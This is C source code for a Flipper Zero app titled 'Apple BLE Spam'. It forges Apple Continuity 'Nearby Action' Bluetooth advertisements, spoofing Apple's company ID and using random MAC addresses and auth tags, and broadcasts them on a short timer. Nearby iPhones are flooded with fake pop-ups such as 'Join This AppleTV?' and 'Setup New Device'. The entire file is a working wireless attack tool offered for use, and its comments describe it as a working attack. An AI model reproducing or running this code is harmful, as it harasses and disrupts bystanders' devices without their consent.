#include <furi.h>
#include <gui/gui.h>
#include <gui/elements.h>
#include <furi_hal_bt.h>
#include <stdint.h>
#include <furi_hal_random.h>
#include <extra_beacon.h>
#include "apple_ble_spam_icons.h"

// Simplified payload structure - only what we need
typedef struct {
    bool random_mac;
    uint8_t action;
    uint8_t flags;
} Payload;

// Single working attack - based on the Random Action that works
static const char* ATTACK_TITLE = "Apple BLE Spam";
static const char* ATTACK_DESCRIPTION = "Spam shuffle Nearby Actions";

// Working packet generation for Nearby Actions
static void make_nearby_action_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    uint8_t size = 27; // Standard size for Nearby Action
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x0F; // Continuity Type (Nearby Action)
    packet[i] = 5; // Continuity Size
    i++;

    // Use the working action and flags from the functional version
    uint8_t action;
    if(payload && payload->action != 0x00) {
        action = payload->action;
    } else {
        // Random nearby actions that work
        const uint8_t actions[] = {0x13, 0x27, 0x20, 0x09, 0x02, 0x0B};
        action = actions[rand() % COUNT_OF(actions)];
    }

    uint8_t flags;
    if(payload && payload->flags != 0x00) {
        flags = payload->flags;
    } else {
        flags = 0xC0;
        if(action == 0x20 && rand() % 2) flags--; // More spam for 'Join This AppleTV?'
        if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'
    }

    packet[i++] = flags; // Action Flags
    packet[i++] = action; // Action Type
    furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
    i += 3;

    // Fill remaining bytes with zeros
    for(int j = i; j < size; j++) {
        packet[j] = 0x00;
    }

    *_size = size;
    *_packet = packet;
}

// Simplified delay options - keeping the working ones
static uint16_t delays[] = {20, 50, 100, 150, 200, 300, 400, 500, 750, 1000, 1500, 2000, 2500, 3000, 4000, 5000};

typedef struct {
    bool resume;
    bool advertising;
    uint8_t delay;
    uint8_t size;
    uint8_t* packet;
    Payload payload;
    FuriTimer* timer;
    uint8_t mac[6];
    FuriString* status_text;
    GapExtraBeaconConfig config;
} State;

// Working BLE implementation using extra_beacon API
static void start_extra_beacon(State* state) {
    uint8_t size;
    uint8_t* packet;
    uint16_t delay = delays[state->delay];
    GapExtraBeaconConfig* config = &state->config;

    config->min_adv_interval_ms = delay;
    config->max_adv_interval_ms = delay * 1.5;
    if(state->payload.random_mac) {
        furi_hal_random_fill_buf(config->address, sizeof(config->address));
    }
    furi_check(furi_hal_bt_extra_beacon_set_config(config));

    make_nearby_action_packet(&size, &packet, &state->payload);
    furi_check(furi_hal_bt_extra_beacon_set_data(packet, size));
    free(packet);

    furi_check(furi_hal_bt_extra_beacon_start());
}

static void adv_timer_callback(void* ctx) {
    State* state = ctx;
    if(!state->advertising) return;
    
    // Stop previous beacon if active
    if(furi_hal_bt_extra_beacon_is_active()) {
        furi_check(furi_hal_bt_extra_beacon_stop());
    }
    
    // Start new beacon
    start_extra_beacon(state);
    
    // Update status with current action
    const char* action_names[] = {"AirDrop", "AppleTV", "Join TV", "Setup", "Transfer", "Backup"};
    uint8_t current_action = (state->payload.action != 0x00) ? state->payload.action : 0x13;
    furi_string_printf(state->status_text, "Sent: %s", action_names[current_action % 6]); // Show current action
    
    // Restart timer
    furi_timer_start(state->timer, delays[state->delay]);
}

static void stop_adv(State* state) {
    if(!state->advertising) return;
    
    state->advertising = false;
    furi_timer_stop(state->timer);
    
    if(furi_hal_bt_extra_beacon_is_active()) {
        furi_check(furi_hal_bt_extra_beacon_stop());
    }
    
    if(state->resume) {
        furi_hal_bt_start_advertising();
    }
    
    furi_string_set(state->status_text, "Stopped");
}

static void start_adv(State* state) {
    if(state->advertising) return;
    
    state->advertising = true;
    
    // Initialize extra beacon config
    state->config.adv_channel_map = GapAdvChannelMapAll;
    state->config.adv_power_level = GapAdvPowerLevel_6dBm;
    state->config.address_type = GapAddressTypePublic;
    
    // Remember if BLE was active
    state->resume = furi_hal_bt_is_active();
    
    // Stop normal BLE advertising
    furi_hal_bt_stop_advertising();
    
    // Start our timer
    furi_timer_start(state->timer, delays[state->delay]);
    
    furi_string_printf(state->status_text, "Started: %s", ATTACK_TITLE);
}

static void toggle_adv(State* state) {
    if(state->advertising) {
        stop_adv(state);
    } else {
        start_adv(state);
    }
}

static void draw_callback(Canvas* canvas, void* ctx) {
    State* state = ctx;

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 14, 12, "Apple BLE Spam");

    // Show delay setting
    canvas_set_font(canvas, FontPrimary);
    char str[32];
    snprintf(str, sizeof(str), "%ims", delays[state->delay]);
    canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
    canvas_draw_str(canvas, 119, 6, "^");
    canvas_draw_str(canvas, 119, 10, "v");

    // Show main attack info
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 4, 24, ATTACK_TITLE);
    canvas_draw_str(canvas, 4, 34, ATTACK_DESCRIPTION);

    // Show status
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 4, 58, furi_string_get_cstr(state->status_text));

    // Start/Stop button
    elements_button_center(canvas, state->advertising ? "Stop" : "Start");
    
    // Help text
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 4, 46, "Up/Down: Change delay");
}

static void input_callback(InputEvent* input, void* ctx) {
    FuriMessageQueue* input_queue = ctx;
    if(input->type == InputTypeShort || input->type == InputTypeLong ||
       input->type == InputTypeRepeat) {
        furi_message_queue_put(input_queue, input, 0);
    }
}

int32_t apple_ble_spam_app(void* p) {
    UNUSED(p);
    
    // Save previous BLE state
    GapExtraBeaconConfig prev_cfg;
    const GapExtraBeaconConfig* prev_cfg_ptr = furi_hal_bt_extra_beacon_get_config();
    if(prev_cfg_ptr) {
        memcpy(&prev_cfg, prev_cfg_ptr, sizeof(prev_cfg));
    }
    uint8_t prev_data[EXTRA_BEACON_MAX_DATA_SIZE];
    uint8_t prev_data_len = furi_hal_bt_extra_beacon_get_data(prev_data);
    bool prev_active = furi_hal_bt_extra_beacon_is_active();

    State* state = malloc(sizeof(State));
    memset(state, 0, sizeof(State));
    
    // Initialize payload with working settings
    state->payload.random_mac = true;
    state->payload.action = 0x00; // Will use random actions
    state->payload.flags = 0x00; // Will use random flags
    
    // Initialize timer
    state->timer = furi_timer_alloc(adv_timer_callback, FuriTimerTypePeriodic, state);
    
    // Initialize status text
    state->status_text = furi_string_alloc();
    furi_string_set(state->status_text, "Ready");

    FuriMessageQueue* input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    ViewPort* view_port = view_port_alloc();
    Gui* gui = furi_record_open(RECORD_GUI);
    view_port_input_callback_set(view_port, input_callback, input_queue);
    view_port_draw_callback_set(view_port, draw_callback, state);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    bool running = true;
    
    while(running) {
        InputEvent input;
        furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);

        switch(input.key) {
        case InputKeyOk:
            toggle_adv(state);
            break;
        case InputKeyUp:
            if(state->delay < COUNT_OF(delays) - 1) {
                if(state->advertising) stop_adv(state);
                state->delay++;
                if(state->advertising) start_adv(state);
            }
            break;
        case InputKeyDown:
            if(state->delay > 0) {
                if(state->advertising) stop_adv(state);
                state->delay--;
                if(state->advertising) start_adv(state);
            }
            break;
        case InputKeyBack:
            if(state->advertising) toggle_adv(state);
            running = false;
            break;
        default:
            continue;
        }

        view_port_update(view_port);
    }

    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    view_port_free(view_port);
    furi_message_queue_free(input_queue);

    // Cleanup
    furi_timer_free(state->timer);
    furi_string_free(state->status_text);
    free(state);

    // Restore previous BLE state
    if(furi_hal_bt_extra_beacon_is_active()) {
        furi_check(furi_hal_bt_extra_beacon_stop());
    }
    if(prev_cfg_ptr) {
        furi_check(furi_hal_bt_extra_beacon_set_config(&prev_cfg));
    }
    furi_check(furi_hal_bt_extra_beacon_set_data(prev_data, prev_data_len));
    if(prev_active) {
        furi_check(furi_hal_bt_extra_beacon_start());
    }

    return 0;
}
